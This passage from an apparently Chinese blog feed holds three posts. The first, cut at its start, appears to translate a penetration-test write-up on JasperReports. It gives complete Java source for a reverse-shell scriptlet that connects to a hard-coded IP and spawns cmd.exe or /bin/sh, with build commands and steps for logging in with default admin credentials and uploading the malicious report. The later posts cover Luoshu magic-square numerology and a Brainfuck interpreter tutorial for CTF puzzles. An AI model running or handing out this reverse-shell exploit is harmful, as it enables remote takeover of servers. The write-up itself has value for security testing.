class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"></span><br><span class="line">这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">这很简单,但这在Java代码本身是如何定义的呢?</span><br><span class="line"></span><br><span class="line">编写攻击脚本</span><br><span class="line"></span><br><span class="line">scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从<span class="string">"here"</span>中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> foxglove.shell;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</span><br><span class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">   Socket socket;</span><br><span class="line"> </span><br><span class="line">   PrintWriter socketWrite;</span><br><span class="line">   BufferedReader socketRead;</span><br><span class="line"> </span><br><span class="line">   PrintWriter commandWrite;</span><br><span class="line">   BufferedReader commandRead;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">static</span> String ip;</span><br><span class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</span><br><span class="line">      ip = <span class="string">"1.1.1.1"</span>;</span><br><span class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</span><br><span class="line">      shell.establishConnection();</span><br><span class="line">      <span class="keyword">new</span> Thread(shell).start();</span><br><span class="line">      shell.getCommand();</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">      spawnShell();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            windows = <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Runtime rt = Runtime.getRuntime();</span><br><span class="line">         Process p;</span><br><span class="line">         <span class="keyword">if</span>(windows) p = rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</span><br><span class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</span><br><span class="line"> </span><br><span class="line">         InputStream readme = p.getInputStream();</span><br><span class="line">         OutputStream writeme = p.getOutputStream();</span><br><span class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</span><br><span class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</span><br><span class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</span><br><span class="line"> </span><br><span class="line">         commandWrite.flush();</span><br><span class="line"> </span><br><span class="line">         String line;</span><br><span class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            socketWrite.println(line);</span><br><span class="line">            socketWrite.flush();</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         p.destroy();</span><br><span class="line"> </span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</span><br><span class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</span><br><span class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</span><br><span class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</span><br><span class="line">         socketWrite.flush();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</span><br><span class="line">      String foo;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</span><br><span class="line">            commandWrite.println(foo);</span><br><span class="line">            commandWrite.flush();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</span><br><span class="line">      r.getShell();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</span><br></pre></td></tr></table></figure><p>这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！</p><p>接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</span><br></pre></td></tr></table></figure><p>如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！</p><h4 id="部署这个新的“Report”"><a href="#部署这个新的“Report”" class="headerlink" title="部署这个新的“Report”"></a>部署这个新的“Report”</h4><p>每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。</p><p>首先很明显我们要去验证一下“jasperadmin/jasperadmin”：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p><p>在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。</p><p>接下来，我们只要右击一个report并且点击“Edit”就好。</p><p>一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p><p>点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p><p>Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p><p>现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈</p><h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p><p>之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。</p><p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。&lt;br&gt;&lt;img src=&quot;https://foxglovesecurity.files.wordpr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>洛书中的数字规律</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/22/洛书中的数字规律/</id>
    <published>2017-01-22T02:57:34.000Z</published>
    <updated>2017-01-22T02:58:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png" alt="1"></p><h2 id="数字规律"><a href="#数字规律" class="headerlink" title="数字规律"></a>数字规律</h2><p><a href="undefined">编辑</a></p><p>那么<a href="http://baike.baidu.com/view/102528.htm" target="_blank" rel="noopener">河图洛书</a>中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即<a href="http://baike.baidu.com/view/97444.htm" target="_blank" rel="noopener">九宫图</a>。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。</p><p>4+9+2=15</p><p>3+5+7=15</p><p>8+1+6=15</p><p>4+3+8=15</p><p>9+5+1=15</p><p>2+7+6=15</p><p>4+5+6=15</p><p>2+5+8=15</p><p>除此之外，还有什么数字玄机呢？</p><p>a+b+c=d+e+f</p><p>a^2+b^2+c^2=d^2+e^2+f^2</p><p>我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。</p><p>递变为三位数依然相等，即438+384+843=276+762+627。</p><p>从下向上递数依然成立，即834+348+483=672+726+267。</p><p>再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。</p><p>三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。</p><p>再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。</p><p>det[4 ，9， 2；3，5，7；8，1，6]=360</p><p>就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;数字规律&quot;&gt;&lt;a href=&quot;#数字规律&quot; class=&quot;headerlink&quot; title=&quot;数字规律&quot;&gt;&lt;/a&gt;数
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Brainfuck</title>
    <link href="http://zer0yu.github.io/2017/01/22/Brainfuck/"/>
    <id>http://zer0yu.github.io/2017/01/22/Brainfuck/</id>
    <published>2017-01-22T02:50:39.000Z</published>
    <updated>2017-01-22T02:53:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>一些隐写题中可能会出此现这种东西，下面我来大概介绍一下：</p><p>官方网站: <a href="http://www.muppetlabs.com/~breadbox/bf/" target="_blank" rel="noopener">http://www.muppetlabs.com/~breadbox/bf/</a></p><p>BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读.</p><p>八种操作符定义如下:</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>&gt;</td><td>指针加一</td></tr><tr><td>&lt;</td><td>指针减一</td></tr><tr><td>+</td><td>指针指向的字节的值加一</td></tr><tr><td>-</td><td>指针指向的字节的值减一</td></tr><tr><td>.</td><td>输出指针指向的单元内容（ASCII码）</td></tr><tr><td>,</td><td>输入内容到指针指向的单元（ASCII码）</td></tr><tr><td>[</td><td>如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</td></tr><tr><td>]</td><td>如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</td></tr></tbody></table><p>Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)：</p><table><thead><tr><th>Brainfuck</th><th>C</th></tr></thead><tbody><tr><td>&gt;</td><td>++ptr;</td></tr><tr><td>&lt;</td><td>–ptr;</td></tr><tr><td>+</td><td>++*ptr;</td></tr><tr><td>-</td><td>–*ptr;</td></tr><tr><td>.</td><td>putchar(*ptr);</td></tr><tr><td>,</td><td>*ptr =getchar();</td></tr><tr><td>[</td><td>while (*ptr) {</td></tr><tr><td>]</td><td>}</td></tr></tbody></table><p>举个例子：</p><p><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;.</code></p><p>这个编译后就是  ‘Hello World!’</p><p>其实只要工具就好了！！！<br>贴一个python实现的解释器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainloop</span><span class="params">(program, bracket_map)</span>:</span> </span><br><span class="line">    pc = <span class="number">0</span> </span><br><span class="line">    tape = Tape() </span><br><span class="line">    <span class="keyword">while</span> pc &lt; len(program): </span><br><span class="line">        code = program[pc] </span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>: </span><br><span class="line">            tape.advance() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>: </span><br><span class="line">            tape.devance() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>: </span><br><span class="line">            tape.inc() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>: </span><br><span class="line">            tape.dec() </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>: </span><br><span class="line">            <span class="comment"># print </span></span><br><span class="line">            os.write(<span class="number">1</span>, chr(tape.get())) </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>: </span><br><span class="line">            <span class="comment"># read from stdin </span></span><br><span class="line">            tape.set(ord(os.read(<span class="number">0</span>, <span class="number">1</span>)[<span class="number">0</span>])) </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> <span class="keyword">and</span> tape.get() == <span class="number">0</span>: </span><br><span class="line">            <span class="comment"># Skip forward to the matching ] </span></span><br><span class="line">            pc = bracket_map[pc] </span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> <span class="keyword">and</span> tape.get() != <span class="number">0</span>: </span><br><span class="line">            <span class="comment"># Skip back to the matching [ </span></span><br><span class="line">            pc = bracket_map[pc] </span><br><span class="line">        pc += <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tape</span><span class="params">(object)</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape = [<span class="number">0</span>] </span><br><span class="line">        self.position = <span class="number">0</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">return</span> self.thetape[self.position] </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, val)</span>:</span> </span><br><span class="line">        self.thetape[self.position] = val </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inc</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape[self.position] += <span class="number">1</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.thetape[self.position] -= <span class="number">1</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.position += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position: </span><br><span class="line">            self.thetape.append(<span class="number">0</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">devance</span><span class="params">(self)</span>:</span> </span><br><span class="line">        self.position -= <span class="number">1</span> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(program)</span>:</span> </span><br><span class="line">    parsed = [] </span><br><span class="line">    bracket_map = &#123;&#125; </span><br><span class="line">    leftstack = [] </span><br><span class="line">    pc = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program: </span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>): </span><br><span class="line">            parsed.append(char) </span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>: </span><br><span class="line">                leftstack.append(pc) </span><br><span class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>: </span><br><span class="line">                left = leftstack.pop() </span><br><span class="line">                right = pc </span><br><span class="line">                bracket_map[left] = right </span><br><span class="line">                bracket_map[right] = left </span><br><span class="line">            pc += <span class="number">1</span> </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(parsed), bracket_map </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(fp)</span>:</span> </span><br><span class="line">    program_contents = <span class="string">""</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        read = os.read(fp, <span class="number">4096</span>) </span><br><span class="line">        <span class="keyword">if</span> len(read) == <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        program_contents += read </span><br><span class="line">    os.close(fp) </span><br><span class="line">    program, bm = parse(program_contents) </span><br><span class="line">    mainloop(program, bm) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    run(os.open(sys.argv[<span class="number">1</span>], os.O_RDONLY, <span class="number">0777</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法：python brain.py flag.br</span></span><br><span class="line"><span class="comment">#在.br文件中保存BrainFuck的代码</span></span><br></pre></td></tr></table></figure><p>c编写的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;;</span><br><span class="line"><span class="keyword">int</span>  p, r, q;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5000</span>], f[<span class="number">5000</span>], b, o, *s=f;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret</span><span class="params">(<span class="keyword">char</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *d;</span><br><span class="line">        r++;</span><br><span class="line">        <span class="keyword">while</span>( *c ) &#123;</span><br><span class="line">                <span class="keyword">switch</span>(o=<span class="number">1</span>,*c++) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'&lt;'</span>: p--;        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'&gt;'</span>: p++;        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span>: a[p]++;     <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span>: a[p]--;     <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'.'</span>: <span class="built_in">putchar</span>(a[p]); fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">','</span>: a[p]=getchar();fflush(<span class="built_in">stdout</span>); <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">                        <span class="keyword">for</span>( b=<span class="number">1</span>,d=c; b &amp;&amp; *c; c++ )</span><br><span class="line">                                b+=*c==<span class="string">'['</span>, b-=*c==<span class="string">']'</span>;</span><br><span class="line">                        <span class="keyword">if</span>(!b) &#123;</span><br><span class="line">                                c[<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">while</span>( a[p] )</span><br><span class="line">                                        interpret(d);</span><br><span class="line">                                c[<span class="number">-1</span>]=<span class="string">']'</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"UNBALANCED BRACKETS"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'#'</span>:</span><br><span class="line">                        <span class="keyword">if</span>(q&gt;<span class="number">2</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n"</span>,</span><br><span class="line">                                       *a,a[<span class="number">1</span>],a[<span class="number">2</span>],a[<span class="number">3</span>],a[<span class="number">4</span>],a[<span class="number">5</span>],a[<span class="number">6</span>],a[<span class="number">7</span>],a[<span class="number">8</span>],a[<span class="number">9</span>],<span class="number">3</span>*p+<span class="number">2</span>,<span class="string">"^"</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>: o=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( p&lt;<span class="number">0</span> || p&gt;<span 